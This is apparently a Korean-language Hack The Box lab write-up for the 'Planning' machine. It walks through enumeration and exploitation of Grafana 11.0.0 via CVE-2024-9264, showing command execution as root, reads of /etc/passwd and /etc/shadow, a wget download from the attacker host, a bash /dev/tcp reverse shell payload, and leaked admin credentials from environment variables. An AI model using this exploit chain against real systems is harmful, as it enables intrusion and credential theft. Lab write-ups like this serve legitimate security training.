10.10.11.68

# nmap

nmap -Pn -sV -T4 -sC --open -oN nmap.txt 10.10.11.68

cat scan.txt

# Nmap 7.95 scan initiated Thu May 29 13:53:52 2025 as: /usr/lib/nmap/nmap -sV -sC -Pn -oN scan.txt -O --open 10.10.11.68

Nmap scan report for 10.10.11.68
Host is up (0.57s latency).
Not shown: 998 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|\_ 256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open http nginx 1.24.0 (Ubuntu)
|\_http-title: Did not follow redirect to http://planning.htb/
|\_http-server-header: nginx/1.24.0 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Thu May 29 13:54:38 2025 -- 1 IP address (1 host up) scanned in 45.85 seconds

내부 도메인으로 변경

┌──(root㉿codespaces-38cdce)-[/]
└─# echo "10.10.11.68 planning.htb" >> /etc/hosts

# ffuf 사용

- -H 헤더 명시 필요 -> HTTP1.1 이상부터는 반드시 명시해야 함
- \*.planning.htb 와 같은 서브도메인에 기능이 숨어있을 수 있음.

ffuf -u http://planning.htb -H "Host:FUZZ.planning.htb" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178 -t 100

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://planning.htb
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
:: Header : Host: FUZZ.planning.htb
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 100
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
:: Filter : Response size: 178

---

grafana [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 662ms]
:: Progress: [66967/151265] :: Job [1/1] :: 87 req/sec :: Duration: [0:12:39] :: Errors: 0 ::

┌──(root㉿docker-desktop)-[/]
└─# http http://grafana.planning.htb/
HTTP/1.1 302 Found
Cache-Control: no-store
Connection: keep-alive
Content-Length: 29
Content-Type: text/html; charset=utf-8
Date: Tue, 03 Jun 2025 09:34:15 GMT
Location: /login
Server: nginx/1.24.0 (Ubuntu)
X-Content-Type-Options: nosniff
X-Frame-Options: deny
X-Xss-Protection: 1; mode=block

<a href="/login">Found</a>.

┌──(root㉿docker-desktop)-[/]
└─# http http://grafana.planning.htb/login

# 버전 확인

http http://grafana.planning.htb/login | grep version
Grafana v11.0.0

# 취약점 검색

sudo apt update
sudo apt install exploitdb

# 업데이트

searchsploit -u

# 안 나옴

searchsploit grafana

# 핵더박스측 제공 정보를 통한 로그인을 위해 폼 확인

As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r
http http://grafana.planning.htb/login | login

```
POST /login
Content-Type: application/json

{
  "user": "admin",
  "password": "0D5oT70Fq13EvB5r"
}

```

# 로그인

curl -c cookies.txt -X POST http://grafana.planning.htb/login -H "Content-Type: application/json" -d '{"user":"admin","password":"0D5oT70Fq13EvB5r"}'

┌──(root㉿docker-desktop)-[/]
└─# curl -c cookies.txt -X POST http://grafana.planning.htb/login \
 -H "Content-Type: application/json" \
 -d '{"user":"admin","password":"0D5oT70Fq13EvB5r"}'

# Netscape HTTP Cookie File -> 쿠기 파일 분석

grafana.planning.htb FALSE / FALSE 1755096838 grafana_session_expiry 1752505433
#HttpOnly_grafana.planning.htb FALSE / FALSE 1755096838 grafana_session 508ccc52bfc97942574a1cb84a726eb1

| 항목      | 설명                                                           |
| --------- | -------------------------------------------------------------- |
| 도메인    | `grafana.planning.htb` – 쿠키가 유효한 호스트                  |
| `FALSE`   | 이 쿠키가 서브도메인에 적용되는지 여부 (FALSE = 해당 도메인만) |
| 경로      | `/` – 쿠키가 유효한 경로                                       |
| Secure    | `FALSE` – HTTPS에서만 전송되는지 여부                          |
| 만료 시간 | `1755096838` (Unix timestamp) – 쿠키 만료 시각                 |
| 이름      | `grafana_session_expiry` 또는 `grafana_session`                |
| 값        | 예: `508ccc52bfc97942574a1cb84a726eb1`                         |

# 로그인 성공

{"message":"Logged in","redirectUrl":"/"}
-c: 쿠키를 저장할 파일
-X POST: HTTP 메소드 지정

# 저장된 쿠키로 본격 접근

curl -b cookies.txt http://grafana.planning.htb/

# duckduckgo 설치

apt update
apt install ddgr

# 삭제

apt remove ddgr

# 검색

ddgr grafana 11 cve

# grafana 11.0.0 cve poc 구글링

https://github.com/nollium/CVE-2024-9264

# pyton 가상화 실행

apt install python3
apt instsall python3-venv

python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# 취약점 실행

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "ls -la /" http://grafana.planning.htb

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "find / -name user | 2>/dev/null" http://grafana.planning.htb
/usr/bin/umount
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/su
/usr/bin/gpasswd

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "id" http://grafana.planning.htb
uid=0(root) gid=0(root) groups=0(root)

# kali

wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O linenum.sh

# kali 파이썬 내장 모듈인 http.server를 이용해서 현재 디렉토리를 기준으로 웹 서버를 8080 포트에서 실행하여 linenum.sh 파일을 다운로드할 수 있도록 합니다.

# 파이썬 서버가 실행된 폴더에 해당 파일이 저장됩니다.

python3 -m http.server 8000

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -q "SELECT content FROM read_blob('/etc/passwd')" http://grafana.planning.htb
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -q "SELECT content FROM read_blob('/etc/shadow')" http://grafana.planning.htb

# 이제 반대로 칼리에서 설치한 linenum 를 타겟의 grafana 서버로 다운로드 받아서 실행

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "wget http://10.10.16.12:8000/linenum.sh" http://grafana.planning.htb

[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: wget http://10.10.16.12:8000/linenum.sh
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT \* FROM read_csv('wget http://10.10.16.12:8000/linenum.sh >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
--2025-06-03 14:19:42-- http://10.10.16.12:8000/linenum.sh
Connecting to 10.10.16.12:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'linenum.sh.3'

     0K .......... .......... .......... .......... .....     100% 8.81K=5.2s

2025-06-03 14:19:48 (8.81 KB/s) - 'linenum.sh.3' saved [46631/46631]

# DuckDB의 read_blob() 함수로 파일 내용 읽기

python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -q "SELECT content FROM read_blob('/tmp/enum_result.txt')" http://grafana.planning.htb

--------------- 정리

OSCP 해킹 과정의 **완전한 데이터 흐름**과 **명령어 분석**을 상세히 설명드리겠습니다.

## 완전한 공격 시나리오 분석

### 1단계: 공격자 환경 준비 (Kali Linux)

```bash
# LinEnum.sh 다운로드 (시스템 정보 수집 도구)
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O linenum.sh
```

**명령어 분석:**

- `wget`: HTTP/HTTPS로 파일 다운로드하는 도구
- `https://raw.githubusercontent.com/...`: GitHub에서 직접 원본 파일 URL
- `-O linenum.sh`: 다운로드한 파일을 'linenum.sh'로 저장
- **LinEnum**: Linux 시스템의 권한 상승 가능성을 찾는 자동화 스크립트

```bash
# HTTP 웹 서버 실행 (파일 전송 준비)
python3 -m http.server 8000
```

**명령어 분석:**

- `python3 -m http.server`: Python 내장 HTTP 서버 모듈 실행
- `8000`: 리스닝 포트 번호
- **목적**: 현재 디렉토리의 파일들을 HTTP로 제공 (linenum.sh 전송용)

**현재 디렉토리 상태:**

```
/root/exploit/
├── linenum.sh           # 다운로드된 시스템 정보 수집 스크립트
├── CVE-2024-9264.py     # Grafana 익스플로잇 도구
└── requirements.txt     # Python 의존성 파일
```

### 2단계: 타겟 시스템 정보 수집

```bash
# 타겟의 /etc/passwd 파일 읽기 (사용자 계정 정보)
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -q "SELECT content FROM read_blob('/etc/passwd')" http://grafana.planning.htb


```

**명령어 분석:**

- `-u admin`: Grafana 사용자명
- `-p 0D5oT70Fq13EvB5r`: Grafana 비밀번호
- `-q`: SQL 쿼리 모드 (DuckDB 쿼리 직접 실행)
- `read_blob('/etc/passwd')`: 파일 내용을 바이너리로 읽는 DuckDB 함수
- **목적**: 시스템 사용자 계정 정보 확인

```bash
# 타겟의 /etc/shadow 파일 읽기 (패스워드 해시 정보)
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -q "SELECT content FROM read_blob('/etc/shadow')" http://grafana.planning.htb
```

**명령어 분석:**

- `/etc/shadow`: Linux 시스템의 암호화된 패스워드 저장 파일
- **목적**: 패스워드 크래킹을 위한 해시 값 수집

### 3단계: 파일 전송 (Kali → 타겟)

```bash
# 타겟 서버에서 linenum.sh 다운로드
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "wget http://10.10.16.12:8000/linenum.sh" http://grafana.planning.htb
```

**명령어 분석:**

- `-c`: 명령어 실행 모드 (Command execution)
- `wget http://10.10.16.12:8000/linenum.sh`: 공격자 웹 서버에서 파일 다운로드
- **데이터 흐름**: `[Kali HTTP Server] → [Network] → [Target /root/]`

**내부 동작 과정:**

```sql
-- CVE 익스플로잇이 생성하는 실제 DuckDB 쿼리
SELECT 1;
install shellfs from community;
LOAD shellfs;
SELECT * FROM read_csv('wget http://10.10.16.12:8000/linenum.sh >/tmp/grafana_cmd_output 2>&1 |');
```

**실행 결과 분석:**

```
[+] Logged in as admin:0D5oT70Fq13EvB5r        # Grafana 로그인 성공
[+] Executing command: wget http://10.10.16.12:8000/linenum.sh  # 명령 실행
[+] Successfully ran duckdb query:              # DuckDB 쿼리 성공
--2025-06-03 14:19:42--  http://10.10.16.12:8000/linenum.sh    # wget 시작
Connecting to 10.10.16.12:8000... connected.   # 연결 성공
HTTP request sent, awaiting response... 200 OK  # HTTP 요청 성공
Length: 46631 (46K) [text/x-sh]                # 파일 크기: 46KB
Saving to: 'linenum.sh.3'                      # 저장 파일명 (중복으로 .3 붙음)
```

### 4단계: 누락된 중간 단계들 (완성을 위한 추가 과정)

#### 4-1. 파일 실행 권한 부여

```bash
# 다운로드한 스크립트에 실행 권한 부여
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "chmod +x linenum.sh.3" http://grafana.planning.htb
```

#### 4-2. LinEnum 스크립트 실행

```bash
# 시스템 정보 수집 스크립트 실행
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "./linenum.sh.3 > /tmp/enum_result.txt 2>&1" http://grafana.planning.htb
```

**명령어 분석:**

- `./linenum.sh.3`: 다운로드한 스크립트 실행
- `> /tmp/enum_result.txt`: 표준 출력을 파일로 리다이렉션
- `2>&1`: 표준 에러도 표준 출력으로 합쳐서 저장

#### 4-3. 실행 완료 확인

```bash
# 스크립트 실행 상태 확인
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "ls -la /tmp/enum_result.txt" http://grafana.planning.htb
```

### 5단계: 결과 데이터 추출

```bash
# 수집된 시스템 정보 읽기
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -q "SELECT content FROM read_blob('/tmp/enum_result.txt')" http://grafana.planning.htb
```

**명령어 분석:**

- `/tmp/enum_result.txt`: LinEnum 스크립트 실행 결과가 저장된 파일
- **목적**: 권한 상승 가능한 취약점들을 분석

## 데이터 흐름 완전 분석

### 파일 저장 위치 맵핑

**공격자 시스템 (Kali - 10.10.16.12):**

```
/root/exploit/
├── linenum.sh              # 원본 LinEnum 스크립트
├── CVE-2024-9264.py        # 익스플로잇 도구
└── cookies.txt             # Grafana 세션 쿠키
```

**타겟 시스템 (Ubuntu - 10.10.11.68):**

```
/root/
├── linenum.sh.3            # 다운로드된 스크립트 (중복으로 .3 접미사)

/tmp/
├── grafana_cmd_output      # CVE 명령 실행 결과 임시 저장
└── enum_result.txt         # LinEnum 실행 결과 (최종 분석 대상)
```

### CVE-2024-9264 내부 동작 원리

#### DuckDB 쿼리 체인 분석

```sql
-- 1단계: 기본 연결 테스트
SELECT 1;

-- 2단계: 쉘 확장 모듈 설치
install shellfs from community;

-- 3단계: 쉘 모듈 로드
LOAD shellfs;

-- 4단계: 명령 실행 (핵심 취약점)
SELECT * FROM read_csv('명령어 >/tmp/grafana_cmd_output 2>&1 |');

-- 5단계: 결과 읽기
SELECT content FROM read_blob('/tmp/grafana_cmd_output');
```

#### 취약점 발생 지점

- **read_csv()** 함수의 **파라미터 인젝션**
- 파일 경로 대신 **쉘 명령어**가 실행됨
- **파이프(|)** 연산자로 명령 체이닝 가능

## 다음 단계 권장사항

### 안정적인 쉘 획득

```bash
# 리버스 쉘 리스너 준비 (새 터미널)
nc -nvlp 4444

# 리버스 쉘 페이로드 실행
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "bash -c 'bash -i >& /dev/tcp/10.10.16.12/4444 0>&1'" http://grafana.planning.htb
```

### 플래그 수집

```bash
# 사용자 플래그 찾기
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "find / -name user.txt -type f 2>/dev/null" http://grafana.planning.htb

# 루트 플래그 찾기
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "find / -name root.txt -type f 2>/dev/null" http://grafana.planning.htb
```

이 과정을 통해 **완전한 시스템 장악**과 **지속적인 액세스**가 가능해집니다.

### ENVIRONMENTAL

[-] Environment information:
AWS*AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
AWS_AUTH_EXTERNAL_ID=
SHLVL=0
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
*=/usr/bin/env
